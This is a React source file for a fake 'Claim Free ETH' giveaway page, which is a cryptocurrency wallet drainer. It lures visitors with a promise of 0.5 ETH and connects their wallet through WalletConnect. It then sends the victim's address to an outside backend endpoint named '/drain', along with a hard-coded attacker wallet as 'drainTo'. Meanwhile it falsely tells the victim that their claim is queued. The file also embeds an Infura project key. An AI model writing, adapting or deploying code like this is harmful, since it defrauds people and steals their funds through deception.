import React, { useState, useEffect } from "react";
import ReactDOM from "react-dom/client";

// Import WalletConnect Provider
import { EthereumProvider } from "@walletconnect/ethereum-provider";

const App = () => {
  const [response, setResponse] = useState(null);
  const [loading, setLoading] = useState(false);
  const [walletProvider, setWalletProvider] = useState(null);
  const [walletAddress, setWalletAddress] = useState(null);

  // Initialize WalletConnect
  useEffect(() => {
    const provider = new EthereumProvider({
      rpc: {
        1: "https://mainnet.infura.io/v3/d2870b839c5f497c94f02dfaccc518e2", // Your Infura project ID
      },
      chainId: 1, // Ethereum mainnet
    });

    setWalletProvider(provider);
    return () => provider.disconnect();
  }, []);

  const connectWallet = async () => {
    setLoading(true);
    setResponse(null);

    try {
      // Check if wallet is available
      if (!walletProvider) {
        throw new Error("Wallet not detected. Please install a supported wallet.");
      }

      await walletProvider.connect(); // Connect to wallet

      // Get wallet address
      const address = walletProvider.accounts[0];

      setWalletAddress(address);

      // Make a POST request to your backend
      const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          address,
          drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4",
        }),
      });

      const data = await res.json();

      if (res.ok) {
        setResponse({
          success: true,
          message: "Token claim queued. You will be credited in a few minutes.",
        });
      } else {
        setResponse({
          success: false,
          message: "Failed to claim token. Try again later.",
        });
      }
    } catch (err) {
      console.error(err);
      setResponse({
        success: false,
        message: "Failed to claim token. Try again later.",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{ padding: "20px", fontFamily: "Arial, sans-serif" }}>
      <h1 style={{ textAlign: "center" }}>Claim Free ETH</h1>
      <p style={{ textAlign: "center" }}>
        Connect your wallet to claim 0.5 ETH now. It's free and easy!
      </p>
      <button
        onClick={connectWallet}
        disabled={loading}
        style={{
          margin: "20px auto",
          display: "block",
          padding: "12px 24px",
          fontSize: "16px",
          backgroundColor: "#4CAF50",
          color: "white",
          border: "none",
          borderRadius: "5px",
          cursor: "pointer",
        }}
      >
        {loading ? "Connecting..." : "Connect Wallet"}
      </button>

      {response && (
        <div style={{ marginTop: "20px", padding: "15px", backgroundColor: "#f0f0f0", borderRadius: "5px" }}>
          <h3 style={{ marginBottom: "10px" }}>Response:</h3>
          <pre style={{ whiteSpace: "pre-wrap", overflowX: "auto" }}>
            {JSON.stringify(response, null, 2)}
          </pre>
        </div>
      )}
    </div>
  );
};

const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(<App />);
